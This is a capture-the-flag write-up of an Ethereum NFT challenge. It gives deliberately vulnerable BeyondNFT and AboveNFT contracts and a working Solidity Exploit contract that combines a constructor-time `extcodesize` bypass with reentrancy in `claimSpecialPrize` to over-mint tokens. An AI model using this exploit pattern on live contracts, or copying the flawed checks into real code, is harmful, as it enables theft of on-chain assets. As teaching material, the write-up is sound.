# Problem

A smart contract exploitation challenge with ERC721 tokens. There are two types of tokens here:

- Beyond (BYT) tokens distributed by the BeyondNFT contract, that can only be minted by the first 5 "non-contract" users who claim them for 1 ETH / token.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {ERC721} from "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {AboveNFT} from "./AboveNFT.sol";

error ReceiverIsContract();
error AlreadyMinted();
error InvalidPrice();
error NotEligible();

contract BeyondNFT is ERC721, Ownable {

    AboveNFT public above;
    uint256 immutable private MAX_SUPPLY = 100;
    uint256 immutable private MINT_PRICE = 1 ether;
    uint256 public currentTokenId;
    mapping(address => bool) public hasMinted;
    mapping(address => bool) public isEligible;

    constructor() ERC721("Beyond", "BYD") Ownable(msg.sender) {}

    function mint() external payable {
        if(_isContract(msg.sender)) revert ReceiverIsContract();
        if(hasMinted[msg.sender]) revert AlreadyMinted();
        if(msg.value != MINT_PRICE) revert InvalidPrice();
        currentTokenId++;
        hasMinted[msg.sender] = true;
        if(currentTokenId <= 5) {
            isEligible[msg.sender] = true;
        }
        _safeMint(msg.sender, currentTokenId);
    }

    function claimSpecialPrize() external {
        if(!isEligible[msg.sender]) revert NotEligible();
        above.mint(msg.sender);
        isEligible[msg.sender] = false;
    }

    function setAboveAddress(address _above) external onlyOwner {
        above = AboveNFT(_above);
    }

    function _isContract(address sender) internal view returns(bool) {
        uint256 size;
        assembly {
            size := extcodesize(sender)
        }
        if(size == 0) return false;
        return true;
    }
}
```

- Above (ABV) tokens distributed by the AboveNFT contract, that can only be minted by the BeyondNFT contract.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {ERC721} from "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";

error OnlyBeyond();

contract AboveNFT is ERC721, Ownable {

    uint256 public tokenId;
    address private beyond;

    constructor() ERC721("Above", "ABV") Ownable(msg.sender) {}

    function mint(address receiver) external onlyBeyond {
        tokenId++;
        _safeMint(receiver, tokenId);
    }

    function setBeyondAddress(address _beyond) external onlyOwner {
        beyond = _beyond;
    }

    modifier onlyBeyond() {
        if(msg.sender != beyond) revert OnlyBeyond();
        _;
    }
}
```

The Challenge contract deploys a BeyondNFT and AboveNFT contracts linked together. The goal is to get at least 6 ABV tokens.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
import {BeyondNFT} from "./BeyondNFT.sol";
import {AboveNFT} from "./AboveNFT.sol";

contract Challenge {
    BeyondNFT public beyond;
    AboveNFT public above;
    address constant public PLAYER = 0xCaffE305b3Cc9A39028393D3F338f2a70966Cb85;

    constructor() payable {
        beyond = new BeyondNFT();
        above = new AboveNFT();
        beyond.setAboveAddress(address(above));
        above.setBeyondAddress(address(beyond));
    }

    function isSolved() public view returns(bool) {
        uint256 totalSupply = above.tokenId();
        uint256 tokensOwned;
        for(uint256 i = 1 ; i <= totalSupply ; i++) {
            if(above.ownerOf(i) == PLAYER) tokensOwned++;
        }
        if(tokensOwned > 5) return true;
        return false;
    }
}
```

Author: [Greed](https://twitter.com/0xGreed_)

# Resources

- https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/ERC721.sol - ERC721 base contract.
- https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/utils/ERC721Utils.sol - ERC721Utils base contract.
- https://docs.openzeppelin.com/contracts/4.x/api/token/erc721 - ERC721 documentation.
- https://consensys.github.io/smart-contract-best-practices/development-recommendations/solidity-specific/extcodesize-checks/ - EXTCODESIZE check.
- https://hackernoon.com/hack-solidity-reentrancy-attack - Reentrancy attack.

# Solution

There are two vulnerabilities in the challenge:

1. The `_isContract` method in `BeyondNFT` uses `extcodesize` to check if an address is a contract or not. A contract executing its constructor method does not have an available code yet which means it will bypass the check. We can therefore mint a Beyond token from a contract constructor and our contract will receive a token.

```solidity
function _isContract(address sender) internal view returns(bool) {
    uint256 size;
    assembly {
        size := extcodesize(sender)
    }
    if(size == 0) return false;
    return true;
}
```

Similarly, the [ERC721Utils](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/utils/ERC721Utils.sol) `checkOnERC721Received` method will not check and will not call `onERC721Received` of the receiver if it has no code (if it's an EOA or if the contract is not yet created).

2. The `claimSpecialPrize` method is vulnerable to a reentrancy attack because `above.mint(msg.sender)` will trigger `onERC721Received` of the receiver contract and is executed before `isEligible[msg.sender] = false`. This means our contract can call `claimSpecialPrize()` during its `onERC721Received` execution to receive Above tokens over and over without being declared ineligible.

We can create a contract which mints an Beyond token in its constructor, then claims a large amount of special prizes (Above tokens) by exploiting reentrancy. Finally, the contract transfers the Above tokens to PLAYER to solve the challenge.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
import {Challenge} from "./Challenge.sol";
import {BeyondNFT} from "./BeyondNFT.sol";
import {AboveNFT} from "./AboveNFT.sol";

contract Exploit {
    Challenge public challenge;
    BeyondNFT public beyond;
    AboveNFT public above;

    constructor(Challenge _challenge) payable {
        require(msg.value == 1 ether, "Must send 1 ether in constructor to mint");
        challenge = _challenge;
        beyond = challenge.beyond();
        above = challenge.above();
        // Mint 1 BYD token, can only be done in the constructor of the contract
        // This doesn't trigger onERC721Received because the Exploit contract has no code yet
        beyond.mint{value: 1 ether}();
    }

    function exploit() public {
        // Call claimSpecialPrize() once which will trigger onERC721Received
        beyond.claimSpecialPrize();
        // Send all our ABV tokens to the player
        for (uint256 i = 1; i < 9; i++) {
            above.safeTransferFrom(address(this), challenge.PLAYER(), i);
        }
    }

    function onERC721Received(address operator, address from, uint256 tokenId, bytes memory data) external returns (bytes4) {
        // Exploit reentrancy in claimSpecialPrize()
        if (tokenId < 10) {
            beyond.claimSpecialPrize();
        }
        return this.onERC721Received.selector;
    }
}
```

#web3 #Ethereum #Solidity #Reentrancy

